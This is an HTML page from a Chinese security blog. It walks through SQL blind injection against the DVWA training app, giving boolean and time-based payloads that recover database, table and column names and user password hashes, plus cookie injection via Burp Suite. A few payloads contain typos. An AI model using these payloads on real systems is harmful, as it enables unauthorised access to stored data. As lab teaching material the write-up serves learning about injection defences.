@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>SQL 盲注攻击实战 - itw&#39;s blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Mr Wen" /><meta name="description" content="" /><meta name="keywords" content="Linux, Github, Network, Cloud, Python" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.55.4 with even 4.0.0" />
+
+
+<link rel="canonical" href="https://itwhs.github.io/post/sql%E7%9B%B2%E6%B3%A8%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/reset-even.css">
+
+
+<meta property="og:title" content="SQL 盲注攻击实战" />
+<meta property="og:description" content="" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://itwhs.github.io/post/sql%E7%9B%B2%E6%B3%A8%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/" />
+<meta property="article:published_time" content="2019-04-14T16:15:57&#43;08:00"/>
+<meta property="article:modified_time" content="2019-04-14T16:15:57&#43;08:00"/>
+
+<meta itemprop="name" content="SQL 盲注攻击实战">
+<meta itemprop="description" content="">
+
+
+<meta itemprop="datePublished" content="2019-04-14T16:15:57&#43;08:00" />
+<meta itemprop="dateModified" content="2019-04-14T16:15:57&#43;08:00" />
+<meta itemprop="wordCount" content="3536">
+
+
+
+<meta itemprop="keywords" content="dvwa," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SQL 盲注攻击实战"/>
+<meta name="twitter:description" content=""/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">itw</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">首页</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">归档</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">标签</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">分类</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">关于我</li>
+      </a><a href="https://github.com/itwhs/">
+        <li class="mobile-menu-item">GitHub</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">itw</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">首页</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">归档</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">标签</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">分类</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">关于我</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://github.com/itwhs/">GitHub</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">SQL 盲注攻击实战</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-04-14 16:15 </span>
+        <div class="post-category">
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"> 网络安全 </a>
+            </div>
+          <span class="more-meta"> 约 3536 字 </span>
+          <span class="more-meta"> 预计阅读 8 分钟 </span>
+        <span id="busuanzi_container_page_pv" class="more-meta"> <span id="busuanzi_value_page_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次阅读 </span>
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+<ul>
+<li><a href="#6-sql-盲注攻击实战">6. SQL 盲注攻击实战</a>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#6-1-sql-盲注的分类">6.1 SQL 盲注的分类</a></li>
+<li><a href="#6-2-low-级别-sql-盲注攻击实战">6.2 Low 级别 SQL 盲注攻击实战</a>
+<ul>
+<li><a href="#6-2-1-布尔型盲注">6.2.1 布尔型盲注</a></li>
+<li><a href="#6-2-2-延时型盲注">6.2.2 延时型盲注</a></li>
+</ul></li>
+<li><a href="#6-3-medium-级别-sql-盲注攻击实战">6.3 Medium 级别 SQL 盲注攻击实战</a></li>
+<li><a href="#6-4-high-级别-sql-盲注攻防">6.4 High 级别 SQL 盲注攻防</a></li>
+<li><a href="#6-5-impossible-级别-sql-盲注攻击">6.5 Impossible 级别 SQL 盲注攻击</a></li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="6-sql-盲注攻击实战">6. SQL 盲注攻击实战</h1>
+
+<h4 id="6-1-sql-盲注的分类">6.1 SQL 盲注的分类</h4>
+
+<p>　　上一章介绍了按照注入类型，SQL 注入可以分为普通注入和盲注。当注入的页面无法直接显示数据内容，就只能靠盲注来猜解。盲注又可以具体分为布尔型盲注和延时型盲注。</p>
+
+<p>　　布尔型盲注是指注入页面中没有直接显示数据内容，但会显示输出的结果对还是错，查询的数据有还是没有。比如输入的 ID 值查询到有该记录，就在页面上显示该记录存在；如果输入的 ID 值不存在，页面上就显示记录不存在，除此之外没有任何更多的信息，我们通过注入构造的任何 SQL 语句也只能返回存在或者不存在两种结果。通过返回结果的对或错来判断构造的 SQL 语句是否成立，这种盲注方式就是布尔型盲注。</p>
+
+<p>　　对于某些 SQL 注入页面，可能页面中任何信息都不返回，甚至连记录是否存在都不告诉你，这时布尔型盲注也就无效了。但是基于 <code>sleep()</code> 函数可以实现延时查询，我们可以构造一个判断语法，如果返回结果为真，则延时 5 秒再进行查询操作。那么我们就可以通过观察提交 SQL 注入语句后，页面响应是否有延时卡顿，来判断我们构造的 SQL 语句是否成立。这种盲注方式就称为延时型盲注。</p>
+
+<hr />
+
+<h4 id="6-2-low-级别-sql-盲注攻击实战">6.2 Low 级别 SQL 盲注攻击实战</h4>
+
+<h5 id="6-2-1-布尔型盲注">6.2.1 布尔型盲注</h5>
+
+<ol>
+<li>设置安全级别为 <code>Low</code>，点击 <code>SQL Injection (Blind)</code> 按钮进入 <code>SQL</code> 盲注攻击模块，随便输入 <code>ID</code> 值，发现只返回一个结果 <code>User ID exists in the database</code>，告诉我们该 <code>ID</code> 存在，没有显示关于该 <code>User</code> 的任何信息，如图 6-1。说明该页面只能通过盲注来攻击
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618758486704.jpg" alt="img" /></p>
+
+<p>图 6-1</p>
+
+<ol>
+<li>文本框中输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code> 都返回结果 <code>exists</code>，说明不是数字型注入点，如图 6-2，图 6-3
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618759018593.jpg" alt="img" /></p>
+
+<p>图 6-2</p>
+
+<p><img src="../../img/15618759414861.jpg" alt="img" /></p>
+
+<p>图 6-3</p>
+
+<ol>
+<li>在文本框中输入 <code>1' and 1=1#</code>，返回结果 <code>exists</code>，如图 6-4，输入 <code>1' and 1=2#</code>，返回结果 <code>MISSING</code>，说明存在 SQL 注入漏洞，为字符型，如图 6-5
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618760218006.jpg" alt="img" /></p>
+
+<p>图 6-4</p>
+
+<p><img src="../../img/15618760550344.jpg" alt="img" /></p>
+
+<p>图 6-5</p>
+
+<ol>
+<li>在文本框中输入 <code>1' and length(database())=1#</code>，返回结果 <code>MISSING</code>，说明当前数据库名长度大于 1 个字符，截图略</li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">   length(database())      //当前数据库名的长度</pre></td></tr></table>
+</div>
+</div>
+<ol>
+<li><p>逐个猜测数据库名字长度，直到输入 <code>1' and length(database())=4#</code> 时，返回结果 <code>exists</code>，说明当前数据库名长度为 4 字符，截图略</p></li>
+
+<li><p>在文本框中输入 <code>1' and ascii(substr(database(),1,1))&gt;97#</code>，返回结果 <code>exists</code>，输入 <code>1' and acsii(substr(database(),1,1))&lt;122#</code>，返回结果 <code>exists</code>，说明数据库名的第一位字符是小写字母。（小写字母 a 的 ASCII 码为 97，小写字母 z 的 ASCII 码为 122），截图略</p></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">   substr(database(),1,1)       //截取数据库名称，从第一个字符开始截，一共截取1个字符
+   ascii()                      //取括号中的字符的 ASCII 码</pre></td></tr></table>
+</div>
+</div>
+<ol>
+<li><p>通过增加数字 97 来逐步缩小范围，直到输入 <code>1' and ascii(substr(database(),1,1))&gt;100#</code>，返回结果 <code>MISSING</code>，说明数据库名的第一个字符的 ASCII 码正好是 100，也就是小写字母 <code>d</code>，截图略</p></li>
+
+<li><p>在文本框中输入 <code>1' and ascii(substr(database(),2,1))&lt;119#</code>，返回结果 <code>exists</code>，输入 <code>1' and ascii(substr(database(),2,1))&lt;118#</code>，返回结果 <code>MISSING</code>，说明第二位字符是小写字母 <code>v</code>，截图略</p></li>
+
+<li><p>使用相同的方法，最终可以猜测出数据库名为 <code>dvwa</code></p></li>
+
+<li><p>在文本框中输入 <code>1' and (select count(table_name) from information_schema.tables where table_schema=database())=1#</code>，返回结果 <code>MISSING</code>，输入 <code>1' and (select count(table_name) from information_schema.tables where table_schema=database())=2#</code>，返回结果 <code>exists</code>，说明当前数据库中存在 2 张表，截图略</p></li>
+
+<li><p>在文本框中输入 <code>1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=1#</code>，返回结果 <code>MISSING</code>，逐步增大猜测数字，直到猜测数字 9，返回结果 <code>exists</code>。最后得知数据库中第一张表名长度为 9 字符，截图略</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">select table_name from information_schema.tables where table_schema=database() limit 0,1
+//查询当前数据库中的表名，只取第 0 和第 1 条记录之间的记录，也就是查询出的第一张表名</pre></td></tr></table>
+</div>
+</div></li>
+
+<li><p>在文本框中输入 <code>1' and length((select table_name from information_schema.tables where table_schema=database() limit 1,2))=1#</code>，返回结果 <code>MISSING</code>，逐步增大猜测数字，直到猜测数字 5，返回结果 <code>exists</code>。最后得知数据库中第二张表名长度为 5 字符，截图略</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">select table_name from information_schema.tables where table_schema=database() limit 1,2
+//查询当前数据库中的表名，只取第 1 和第 2 条之间的记录，也就是查询出的第二张表名</pre></td></tr></table>
+</div>
+</div></li>
+
+<li><p>在文本框中输入 <code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97#</code>，返回结果 <code>exists</code>，输入 <code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122#</code>，返回结果 <code>exists</code>，说明第一张表名的第一位字符为小写字母 (原理同第 6 步)</p></li>
+
+<li><p>逐步缩小范围，最终可确认第一张表名的第一位字符为字母 g。输入 <code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;97#</code>，猜解第一张表名的第二位字符，过程略</p></li>
+
+<li><p>输入 <code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,2),1,1))&gt;97#</code>，猜解第二张表名的第一位字符。重复上述步骤最终可猜解出两个表名分别为 <code>guestbook</code> 和 <code>users</code>，过程略</p></li>
+
+<li><p>输入 <code>1 and (select count(column_name) from information_schema.columns where table_name='users')=1 #</code>，来猜解 <code>users</code> 表中的字段数量，通过不断加大猜解数字来缩小范围，最终确定字段数量，过程略</p></li>
+
+<li><p>输入 <code>1' and length((select column_name from information_schema.columns where table_name='users' limit 0,1))=1 #</code>，猜解 <code>users</code> 表中第一个字段名的长度，过程略</p></li>
+
+<li><p>输入 <code>1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1)1,1))&lt;97#</code>，猜解表中第一个字段名的第一位字符内容，原理同上，过程略</p></li>
+
+<li><p>最终猜解出存在 <code>user</code> 和 <code>password</code> 字段，原理同上，过程略</p></li>
+
+<li><p>输入 <code>1' and ascii(substr((select user from users limit 0,1),1,1))&lt;97#</code>，来猜解第一个用户的用户名的第一位字符内容。最终可以猜解出所有用户的用户名和密码密文，原理同上，过程略</p></li>
+</ol>
+
+<h5 id="6-2-2-延时型盲注">6.2.2 延时型盲注</h5>
+
+<ol>
+<li><p>在文本框输入 <code>1' and sleep(5)#</code>，页面响应有明显延时，输入 <code>1 and sleep(5)</code>，页面响应迅速，说明该注入点为字符型</p></li>
+
+<li><p>在文本框输入 <code>1' and if(length(database())=1,sleep(5),1)#</code>，页面没有延时，说明 <code>length(database())=1</code> 结果为假，当前数据库名长度不为 1；逐步增加猜测数字，直到输入 <code>1' and if(length(database())=4,sleep(5),1)#</code>，页面延时，说明当前数据库名长度为 4</p></li>
+
+<li><p>在文本框输入 <code>1' and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)#</code>，页面延时；输入 <code>1' and if(ascii(substr(database(),1,1))&lt;9122,sleep(5),1)#</code>，页面没有延时，说明当前数据库名第一个字符为小写字母，原理同布尔型盲注。逐渐缩小猜解范围，页面有延时说明猜解正确，页面无延时说明猜解错误，最终可猜解出数据库名第一个字符内容为 d</p></li>
+
+<li><p>后续步骤思路与布尔型盲注一致，只需要按照语法把要猜解的条件代入，再根据页面响应是否出现延时来判断构造的 SQL 注入语句是否成立，就可以逐步猜解出需要查询的数据库信息，过程略。注入语法如下：</p></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><span class="lnt">1
+</span><span class="lnt">2
+</span></pre></td>
+<td class="lntd">
+<pre class="chroma">   1&#39; and if (要猜解的条件,sleep(5),1)#  
+   //判断，如果要猜解的条件成立，则返回 sleep(5)，延时 5 秒；不成立则返回数字 1</pre></td></tr></table>
+</div>
+</div>
+<hr />
+
+<h4 id="6-3-medium-级别-sql-盲注攻击实战">6.3 Medium 级别 SQL 盲注攻击实战</h4>
+
+<ol>
+<li>设置安全级别为 <code>Medium</code>，在 SQL 盲注攻击界面看到与 SQL 注入攻击的 Medium 级别一样，只给出了选择框，没有给用户输入信息的地方。且提交后 <code>URL</code> 没有携带任何信息，说明页面提交方式为 <code>POST</code>。基于上述判断，需要使用 <code>Burpsuite</code> 来构造数据包，如图 6-6
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618806835356.jpg" alt="img" /></p>
+
+<p>图 6-6</p>
+
+<ol>
+<li>查看页面源码，发现也与 SQL 注入攻击的 <code>Medium</code> 级别一样，使用了 <code>mysqli_real_escape_string</code> 函数，如图 6-7，对引号进行转义，会导致带引号的 SQL 注入参数出错。
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618809028627.jpg" alt="img" /></p>
+
+<p>图 6-7</p>
+
+<ol>
+<li>根据上一章节 <code>Medium</code> 级别 SQL 注入的绕过方法，该级别的 SQL 盲注只需要在 <code>Low</code> 级别的基础上使用 <code>Burpsuite</code> 拦截数据包来添加注入信息，并把凡带有引号的值进行 HEX 编码，就可以成功绕过限制，过程略</li>
+</ol>
+
+<hr />
+
+<h4 id="6-4-high-级别-sql-盲注攻防">6.4 High 级别 SQL 盲注攻防</h4>
+
+<ol>
+<li>安全级别设置为 High，在 SQL 盲注攻击页面看到与 SQL 注入攻击的 High 级别一样，把提交信息的页面和输出结果的页面进行了分离来防御 SQLMap 等工具的自动化注入，如图 6-8
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618813278704.jpg" alt="img" /></p>
+
+<p>图 6-8</p>
+
+<ol>
+<li>查看页面源码，发现变更为使用 <code>cookie</code> 来传递 ID 值，加入了 <code>LIMIT 1</code>，来限制查询更多的数据，并通过 <code>sleep()</code> 函数来造成查询不到数据时随机延时，从而扰乱基于延时的 SQL 盲注，如图 6-9
+
+<br /></li>
+</ol>
+
+<p><img src="../../img/15618815811481.jpg" alt="img" /></p>
+
+<p>图 6-9</p>
+
+<ol>
+<li><p>对于使用 <code>cookie</code> 来传递 ID 值，我们可以使用 <code>Burpsuite</code> 抓包来修改 <code>cookie</code>；对于 <code>LIMIT 1</code>，使用 <code>#</code> 注释掉；对于 <code>sleep()</code> 函数，正常使用布尔型盲注就可以了</p></li>
+
+<li><p>设置好 <code>Burpsuite</code> 和浏览器的代理，随便输入一个 <code>ID</code> 值，拦截数据包后，第一个数据包正常放行，修改第二个数据包，在 <code>cookie:id=1</code> 后加入 <code>' and length(database())=1#</code>，返回结果 <code>MISSING</code>，如图 6-10，图 6-11；加入 <code>' and length(database())=4#</code>，返回结果 <code>exists</code>，如图 6-12，图 6-13。发现可以成功注入，并猜解出当前数据库名的长度为 4</p></li>
+</ol>
+
+<p><img src="../../img/15618826020470.jpg" alt="img" /></p>
+
+<p>图 6-10</p>
+
+<p><img src="../../img/15618827031240.jpg" alt="img" /></p>
+
+<p>图 6-10</p>
+
+<p><img src="../../img/15618827883675.jpg" alt="img" /></p>
+
+<p>图 6-11</p>
+
+<p><img src="../../img/15618828153603.jpg" alt="img" /></p>
+
+<p>图 6-12</p>
+
+<ol>
+<li>后续猜解步骤思路与 <code>Low</code> 级别一致，只需要在 <code>Burpsuite</code> 中对 <code>cookie</code> 值进行注入即可</li>
+</ol>
+
+<hr />
+
+<h4 id="6-5-impossible-级别-sql-盲注攻击">6.5 Impossible 级别 SQL 盲注攻击</h4>
+
+<p>　　设置安全级别为 <code>Impossible</code>，查看 SQL 盲注页面源码，发现使用了 <code>PDO</code> 技术，几乎彻底杜绝了 SQL 注入；另外还使用了 <code>Anti-CSRF token</code> 机制，使用随机 <code>token</code> 来阻止自动化注入。该防御机制下，SQL 盲注几乎无法实现，如图 6-13
+　　</p>
+
+<p><img src="../../img/15618915821786.jpg" alt="img" /></p>
+
+<p>图 6-13</p>
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Mr Wen</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2019-04-14 16:15
+        
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a target="_blank" rel="license noopener" href="https://github.com/itwhs/itwhs.github.io/blob/master/LICENSE">MIT</a></span>
+  </p>
+</div>
+<div class="post-reward">
+  <input type="checkbox" name="reward" id="reward" hidden />
+  <label class="reward-button" for="reward">赞赏支持</label>
+  <div class="qr-code">
+    
+    <label class="qr-code-image" for="reward">
+        <img class="image" src="/img/reward/wechat.png">
+        <span>微信打赏</span>
+      </label>
+    <label class="qr-code-image" for="reward">
+        <img class="image" src="/img/reward/alipay.jpg">
+        <span>支付宝打赏</span>
+      </label>
+  </div>
+</div><footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/dvwa/">dvwa</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">反射型 XSS 攻击实战</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/">
+            <span class="next-text nav-default">SQL 注入攻击实战</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+  
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:itwhs@foxmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://blog.csdn.net/wenhs5479" class="iconfont icon-cnblogs" title="cnblogs"></a>
+      <a href="https://github.com/itwhs" class="iconfont icon-github" title="github"></a>
+  <a href="https://itwhs.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2018 - 
+    2019
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">Mr Wen</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/timeago.js@3.0.2/dist/timeago.min.js" integrity="sha256-jwCP0NAdCBloaIWTWHmW4i3snUNMHUNO+jr9rYd2iOI=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/timeago.js@3.0.2/dist/timeago.locales.min.js" integrity="sha256-ZwofwC1Lf/faQCzN7nZtfijVV6hSwxjQMwXL4gn9qU8=" crossorigin="anonymous"></script>
+  <script><!-- NOTE: timeago.js uses the language code format like "zh_CN" (underscore and case sensitive) -->
+    var languageCode = "zh-cn".replace(/-/g, '_').replace(/_(.*)/, function ($0, $1) {return $0.replace($1, $1.toUpperCase());});
+    timeago().render(document.querySelectorAll('.timeago'), languageCode);
+    timeago.cancel();  
+  </script>
+<script type="text/javascript" src="/dist/even.26188efa.min.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-139425163-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
